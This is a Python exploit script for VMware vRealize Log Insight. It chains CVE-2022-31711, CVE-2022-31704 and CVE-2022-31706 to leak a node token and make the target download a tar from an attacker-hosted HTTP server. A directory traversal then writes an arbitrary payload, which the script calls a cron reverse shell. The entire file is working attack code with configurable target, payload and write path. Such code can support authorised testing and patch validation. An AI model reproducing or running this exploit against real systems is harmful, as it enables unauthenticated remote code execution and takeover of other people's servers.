import argparse
import os
import sys
import http.server
import tarfile
import queue
import tempfile
import threading
import re

sys.path.append("gen-py")
from loginsight import DaemonCommands
from loginsight.ttypes import *
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target_address", required=True, help="Target IP address of VMware vRealize Log Insight")
    parser.add_argument("--target_port", type=int, default=16520, help="Target Thrift port")
    parser.add_argument("--http_server_address", required=True, help="Local IP address to use for HTTP payload sever")
    parser.add_argument("--http_server_port", required=True, help="Port to use for local HTTP payload server")
    parser.add_argument("--payload_file", required=True, help="File from which to read the payload contents")
    parser.add_argument("--payload_path", required=True, help="Full file system path where payload should be written")
    return parser.parse_args()


def create_malicious_tar(payload, payload_path):
    with tarfile.open("exploit.tar", 'w') as malicious_tar:
        # Just use 'fr_eula.txt` for files where we don't care about
        # the content. It is important that we don't use the actual context
        # so a real upgrade doesn't happen
        for arcname in ['upgrade-image-8.10.2-21145187.rpm', 'upgrade-driver', 'eula.txt']:
            malicious_tar.add('fr_eula.txt', arcname=arcname)

        # Add the files where we want the same content
        for arcname in ['VMware-vRealize-Log-Insight.cert', 'VMware-vRealize-Log-Insight.mf']:
            malicious_tar.add(arcname, arcname=arcname)

        # Add our payload
        malicious_tar.add(payload, ("../../" + payload_path).replace("//", "/"))


def remote_pak_download(client, node_token, http_server_address, http_server_port):
    command = Command()
    command.commandType = 9

    download_command = RemotePakDownloadCommand()
    download_command.sourceNodeToken = node_token
    # The remote system does not return an error if this url is incorrect.
    # It just silently fails
    download_command.requestUrl = f"http://{http_server_address}:{http_server_port}/exploit.tar"
    download_command.fileName = "exploit"

    command.remotePakDownloadCommand = download_command

    command_with_timeout = CommandWithTimeout()
    command_with_timeout.command = command
    command_with_timeout.timeoutMillis = 2000
    with http.server.HTTPServer((http_server_address, int(http_server_port)), http.server.SimpleHTTPRequestHandler) as httpd:
        def send_remote_pak_download_command(client, command, q):
            q.put(client.runCommand(command))

        q = queue.Queue()
        client_thread = threading.Thread(
            target=send_remote_pak_download_command,
            args=(client, command_with_timeout, q))
        client_thread.start()
        httpd.handle_request()
        client_thread.join()
        response = q.get()
        if response.commandHandle.error is not None:
            raise Exception(f"Unable to initiate remote pak download: {response.commandHandle.error}")


def pak_upgrade(client):
    command = Command()
    command.commandType = 8

    pak_upgrade_command = PakUpgradeCommand()
    pak_upgrade_command.fileName = "exploit.pak"
    pak_upgrade_command.eulaOnly = False
    pak_upgrade_command.outputFile = "hello"
    pak_upgrade_command.outputOnly = False
    pak_upgrade_command.locale = "eng"
    pak_upgrade_command.forceInstall = False

    command.pakUpgradeCommand = pak_upgrade_command

    command_with_timeout = CommandWithTimeout()
    command_with_timeout.command = command
    command_with_timeout.timeoutMillis = 2000
    response = client.runCommand(command_with_timeout)
    if not "The PAK file is corrupted" in response.commandStatus.exitedCommandStatus.lastStatusUpdate.statusMessage:
        print(response.commandStatus.exitedCommandStatus.lastStatusUpdate.statusMessage)
        raise Exception("Failed to trigger directory traversal")


def get_node_token(client):
    config_response = client.getConfig(GetConfigRequest())

    node_type = client.getNodeType()
    if node_type == StrataNodeType.STANDALONE:
        # TODO use health status instead
        regex = re.compile(r'token=\"([^\"]*)')
        match = regex.search(config_response.configBlob)
        if not match:
            raise Exception("Unable to find token in config")
        return match.group(1)
    elif node_type == StrataNodeType.WORKER:
        print("Worker node, getting master token")
        # TODO test
        return config_response.masterToken
    else:
        raise Exception("Unknown node type")


def main():
    args = parse_args()
    # Add payload
    create_malicious_tar(args.payload_file, args.payload_path)

    trans = TSocket.TSocket(args.target_address, int(args.target_port))
    trans = TTransport.TFramedTransport(trans)
    proto = TBinaryProtocol.TBinaryProtocol(trans)
    client = DaemonCommands.Client(proto)

    trans.open()

    print("[+] Using CVE-2022-31711 to leak node token")
    node_token = get_node_token(client)
    print(f"[+] Found node token: {node_token}")

    print("[+] Using CVE-2022-31704 to trigger malicious file download")
    remote_pak_download(
        client,
        node_token,
        args.http_server_address,
        args.http_server_port
    )
    print("[+] File successfully downloaded")

    print("[+] Using CVE-2022-31706 to trigger directory traversal and write cron reverse shell")
    pak_upgrade(client)
    print("[+] Payload successfully delivered")

    trans.close()


if __name__ == "__main__":
    main()
